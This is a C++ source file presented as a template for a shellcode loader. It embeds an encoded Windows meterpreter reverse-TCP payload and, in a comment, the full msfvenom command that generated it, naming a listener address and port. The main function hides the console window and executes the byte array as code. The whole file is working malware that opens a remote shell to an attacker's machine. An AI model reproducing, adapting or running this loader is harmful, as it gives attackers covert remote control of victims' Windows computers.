// this is template for c++ based shell code
#include <iostream>
#include <windows.h>
// msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.110 lport=4444 --platform windows -a x86 -b "\x00" -e x86/shikata_ga_nai -f c
using namespace std;

unsigned char code[] =
    "\xb8\xf1\x9d\xa3\x27\xd9\xed\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
    //this comment will be ommitted
    "\x59\x31\x42\x14\x83\xea\xfc\x03\x42\x10\x13\x68\x5f\xcf\x5c"
    //this comment will be ommitted
    "\x93\xa0\x10\x02\x1d\x45\x21\x10\x79\x0d\x10\xa4\x09\x43\x99"
    //this comment will be ommitted
    "\x4f\x5f\x70\x2a\x3d\x48\x49\xd3\xce\x3f\xe3\x0d\xe1\xff\x58"
    //this comment will be ommitted
    "\x6d\x60\x7c\xa3\xa2\x42\xbd\x6c\xb7\x83\xfa\x3a\xbd\x6c\x56"
    //this comment will be ommitted
    "\x36\x6f\x62\xdc\x0a\xac\x83\x32\x01\x8c\xfb\x37\xd6\x5a\x8f"
    //this comment will be ommitted
    "\x7b\xd6\xb4\xe4\xcc\xc0\xbf\xa2\xec\xf1\x6c\x02\x68\x38\xe6"
    //this comment will be ommitted
    "\x9e\x3b\x30\x33\x55\xba\x90\x0d\x96\x8c\xdc\xc2\xa9\x20\xd1"
    //this comment will be ommitted
    "\x1b\xee\x87\x0a\x6e\x04\xf4\xb7\x69\xdf\x86\x63\xff\xff\x21"
    //this comment will be ommitted
    "\xe7\xa7\xdb\xd0\x24\x31\xa8\xdf\x81\x35\xf6\xc3\x14\x99\x8d"
    //this comment will be ommitted
    "\xf8\x9d\x1c\x41\x89\xe6\x3a\x45\xd1\xbd\x23\xdc\xbf\x10\x5b"
    //this comment will be ommitted
    "\x3e\x67\xcc\xf9\x35\x8a\x1b\x7d\xb6\x54\x24\x23\x20\x98\xe9"
    //this comment will be ommitted
    "\xdc\xb0\xb6\x7a\xae\x82\x19\xd1\x38\xae\xd2\xff\xbf\xa7\xf5"
    //this comment will be ommitted
    "\xff\x10\x0f\x95\x01\x91\x6f\xbf\xc5\xc5\x3f\xd7\xec\x65\xd4"
    //this comment will be ommitted
    "\x27\x10\xb0\x40\x22\x86\x97\x84\x32\x5c\x80\xa6\x32\x71\x0c"
    //this comment will be ommitted
    "\x2f\xd4\x21\xfc\x7f\x49\x82\xac\x3f\x39\x6a\xa7\xb0\x66\x8a"
    //this comment will be ommitted
    "\xc8\x1b\x0f\x21\x27\xf5\x67\xde\xde\x5c\xf3\x7f\x1e\x4b\x79"
    //this comment will be ommitted
    "\xbf\x94\x79\x7d\x0e\x5d\x08\x6d\x67\x3a\xf2\x6d\x78\xaf\xf2"
    //this comment will be ommitted
    "\x07\x7c\x79\xa5\xbf\x7e\x5c\x81\x1f\x80\x8b\x92\x58\x7e\x4a"
    //this comment will be ommitted
    "\xa2\x13\x49\xd8\x8a\x4b\xb6\x0c\x0a\x8c\xe0\x46\x0a\xe4\x54"
    //this comment will be ommitted
    "\x33\x59\x11\x9b\xee\xce\x8a\x0e\x11\xa6\x7f\x98\x79\x44\x59"
    //this comment will be ommitted
    "\xee\x25\xb7\x8c\x6c\x21\x47\x52\x5b\x8a\x2f\xac\xdb\x2a\xaf"
    //this comment will be ommitted
    "\xc6\xdb\x7a\xc7\x1d\xf3\x75\x27\xdd\xde\xdd\x2f\x54\x8f\xac"
    //this comment will be ommitted
    "\xce\x69\x9a\x71\x4e\x69\x29\xaa\x61\x10\x42\x4d\x82\xe5\x4a"
    //this comment will be ommitted
    "\x2a\x83\xe5\x72\x4c\xb8\x33\x4b\x3a\xff\x87\xe8\x35\x4a\xa5"
    //this comment will be ommitted
    "\x59\xdc\xb4\xf9\x9a\xf5";
//this comment will be ommitted

int main(int argc, char **argv)
{
    int i;
    for (i = 0; i < sizeof code; i++)
    {
        cout << code[i];
    }
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
    int foo_value = 0;

    int (*foo)() = (int (*)())code;
    foo_value = foo();
}
